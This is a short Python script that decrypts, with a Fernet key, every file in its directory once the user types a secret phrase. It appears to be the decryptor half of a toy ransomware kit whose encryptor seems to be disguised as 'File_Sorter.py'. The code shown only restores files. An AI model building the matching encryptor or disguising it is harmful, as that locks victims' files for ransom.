import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file in ("File_Sorter.py", "Opener.key", "Decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to decrypt:", files)

try:
    with open("Opener.key", "rb") as key_file:
        key = key_file.read()
except FileNotFoundError:
    print("Error: 'Opener.key' file not found.")
    exit()

secret_phrase = "I am a communist"
user_phrase = input("Enter the secret phrase to decrypt your files: ").strip()

if user_phrase.lower() == secret_phrase.lower():
    print("Secret phrase matched! Decrypting files...")
    for file in files:
        try:
            with open(file, "rb") as target_file:
                contents = target_file.read()
            contents_decrypt = Fernet(key).decrypt(contents)
            with open(file, "wb") as target_file:
                target_file.write(contents_decrypt)
            print(f"Decrypted: {file}")
        except Exception as e:
            print(f"Error decrypting {file}: {e}")
else:
    print("Incorrect secret phrase. Exiting.")
